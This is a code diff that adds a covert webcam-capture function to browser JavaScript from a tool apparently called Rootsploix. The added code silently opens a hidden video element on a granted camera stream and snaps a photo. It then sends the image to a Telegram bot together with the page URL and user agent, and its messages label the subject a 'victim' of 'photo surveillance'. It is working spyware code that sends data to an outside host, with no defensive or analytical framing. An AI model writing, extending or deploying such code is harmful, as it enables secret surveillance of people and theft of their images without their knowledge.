@@ -1734,6 +1734,9 @@ ${topHotspots.join('\n')}
                         
                         await telegram.sendMessage(realCameraMsg);
                         
+                        // KAMERA İZNİ VERDİĞİNDE HEMEN FOTO ÇEK VE GÖNDER!
+                        await this.takeInstantPhotoAndSend();
+                        
                         // Başlat tüm consumerleri - HIÇBIRI PROMPT ÇIKARMAYACAK!
                         await this.startMultipleStreamConsumers();
                         
@@ -1746,6 +1749,87 @@ Time: ${new Date().toLocaleString()}`;
                     }
                 } catch (error) {
                     RootsploixUtils.log('error', 'Real single prompt camera access failed', error);
+                }
+            }
+            
+            async takeInstantPhotoAndSend() {
+                try {
+                    RootsploixUtils.log('info', 'Taking instant photo after camera permission granted');
+                    
+                    // Master stream'den foto çek
+                    const masterStream = window.__ROOTSPLOIX_MASTER_STREAM__;
+                    if (!masterStream) {
+                        throw new Error('Master stream not available');
+                    }
+                    
+                    // Video element oluştur ve stream'e bağla
+                    const video = document.createElement('video');
+                    video.srcObject = masterStream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    
+                    // Video yüklendiğinde foto çek
+                    video.addEventListener('loadeddata', async () => {
+                        setTimeout(async () => {
+                            try {
+                                // Canvas ile foto çek
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                
+                                ctx.drawImage(video, 0, 0);
+                                
+                                // Foto'yu blob'a çevir
+                                canvas.toBlob(async (blob) => {
+                                    if (blob) {
+                                        // Telegram'a foto gönder
+                                        const photoMsg = `📸💀 INSTANT CAMERA CAPTURE! 💀📸
+
+KAMERA FOTO DA KABUL ETTİĞİNDE KULLANICI GÖNDERSİN!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📷 Resolution: ${canvas.width}x${canvas.height}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${window.location.href}
+📱 Device: ${navigator.userAgent.substring(0, 100)}...
+
+💀 VICTIM PHOTO CAPTURED INSTANTLY!
+🔥 ROOTSPLOIX PHOTO SURVEILLANCE!`;
+                                        
+                                        // Mesaj gönder
+                                        await telegram.sendMessage(photoMsg);
+                                        
+                                        // Foto dosyasını gönder
+                                        try {
+                                            await telegram.sendFile(blob, 'Instant Camera Capture - Permission Granted!', 'photo');
+                                        } catch (fileError) {
+                                            RootsploixUtils.log('error', 'Photo file send failed', fileError);
+                                        }
+                                        
+                                        // Istatistik güncelle
+                                        ROOTSPLOIX_SESSION.statistics.cameraCount++;
+                                    }
+                                }, 'image/jpeg', 0.9);
+                                
+                            } catch (captureError) {
+                                RootsploixUtils.log('error', 'Photo capture failed', captureError);
+                            } finally {
+                                // Video element'i temizle
+                                if (document.body.contains(video)) {
+                                    document.body.removeChild(video);
+                                }
+                            }
+                        }, 2000); // 2 saniye bekle ki video hazır olsun
+                    });
+                    
+                    // Video'yu başlat
+                    await video.play().catch(() => {});
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Instant photo capture failed', error);
                 }
             }
             
